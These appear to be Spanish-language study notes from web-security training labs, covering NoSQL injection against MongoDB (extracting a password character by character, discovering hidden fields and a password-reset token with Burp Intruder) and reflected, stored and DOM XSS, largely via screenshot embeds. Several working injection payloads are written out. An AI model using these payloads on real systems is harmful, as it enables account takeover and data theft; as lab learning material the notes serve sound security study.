![[Pasted image 20240404110318.png]]
Utilizamos expresión regular, no nos da error por lo que copiamos la petición y  visitamos la página para que el navegador procese el login
![[Pasted image 20240404111926.png]]
![[Pasted image 20240404111949.png]]

### Lab - Explotando NoSQL injection extracción de datos
El enunciado dice que la password posee sólo palabras en minúscula
Con ctrl +U puedo encodear en URL lo seleccionado

![[Pasted image 20240404114219.png]]
Este payload comprueba la longitud de la contraseña, temdremos que acertar el campo password
`administrator' && this.password.length < 30 || 'a'=='b`
![[Pasted image 20240404114905.png]]
Mandaremos la petición al intruder con este payload con clusterbomb dónde nos fijaremos en el Length, en los numeros del 0 al 7 y pondremos la contraseña en orden
`administrator' && this.password[§0§]=='§a§`
![[Pasted image 20240404115543.png]]
![[Pasted image 20240404115928.png]]

### Lab - Explotando NoSQL para extraer campos desconocidos
Podemos averiguar que campos existen en MongoDB con estos payloads, o haciendo un ataque de diccionario aplicando la variable en el campo
- `lookup?username=admin'+%26%26+this.password!%3d'`
- `admin' && this.username!='` 
- `admin' && this.foo!='`
- `{"username":"wiener","password":"peter", "$where":"0"}` --> probar con 1 añadimos operadores
- `"$where":"Object.keys(this)[0].match('^.{0}a.*')"` podemos inspeccionar un campo de daos haciendo fuerza bruta
Probamos con una regex, nos dice que la password debe cambiar
![[Pasted image 20240404123813.png]]
Resetearemos la passwd
![[Pasted image 20240404123923.png]]
Vemos que podemos añadir un campo al JSON ya que no hay errores
![[Pasted image 20240404124100.png]]
Sin embargo un valor verdadero lo acepta
![[Pasted image 20240404124638.png]]
Probaremos un object match mandandolo al intruder añadiendo 2 Payloads --> trataremos de averiguar sus campos
- 1 Payload tratará de números del 1 al 20
![[Pasted image 20240404132153.png]]
HAcemos una coincidencia del error de cuenta bloqueada, esas serán las peticiones que queremos ya que aceptará la web que hay una de esas letras en la posición que indica el primer payload
![[Pasted image 20240404132138.png]]
Obtenemos estos campos:
- username
- password
- email
- id
- newPwdTkn
![[Pasted image 20240404132425.png]]
En festa petición vemos que sucede si ponemos los campos obtenidos:
![[Pasted image 20240404133345.png]]
Probaremos en el intruder el campo del token --> `newPwdTkn` 
![[Pasted image 20240404133710.png]]
![[Pasted image 20240404134213.png]]
Gracias al grepeo establecido sabemos que caracteres son
![[Pasted image 20240404134228.png]]
Obtenemos token y clickamos btn + right --> copiar response en browser
![[Pasted image 20240404134247.png]]

# XSS 
¿Qué riesgos tiene un XSS?
- Se hace pasar o disfrazarse como el usuario víctima.
- Realte cualquier acción que el usuario pueda realizar.
- Lee los datos a los que el usuario pueda acceder.
- Captura las credenciales de inicio de sesión del usuario.
- Reale desfiguración virtual del sitio web.
- Inyecte la funcionalidad troyana en el sitio web.
### Lab - XSS Reflected
Simplemente en la barra de búsqueda ponemos y refrescamos
![[Pasted image 20240228192950.png]]
![[Pasted image 20240228192959.png]]

### Lab - XSS Stored

Al refrescar podemos ver lo que hemos puesto, esto es muy útil para mandar cookies a servers externos, sacar una cookie o cargar otros archivos a los usuarios que visiten esta pag.
![[Pasted image 20240228193358.png]]

### Lab - DOM XSS

Al ser una vuln basada en documento, trackeamos con burpsuite para ver que nos devuelve:
![[Pasted image 20240228200219.png]]
Nos damos cuenta que en la query ya esteríamos dentro de código JS así que es fácil de eludir con:

![[Pasted image 20240228200100.png]]

### Lab - DOM XSS en document.write unido a location.search #pendiente

![[Pasted image 20240404142908.png]]
![[Pasted image 20240404142929.png]]
![[Pasted image 20240404143440.png]]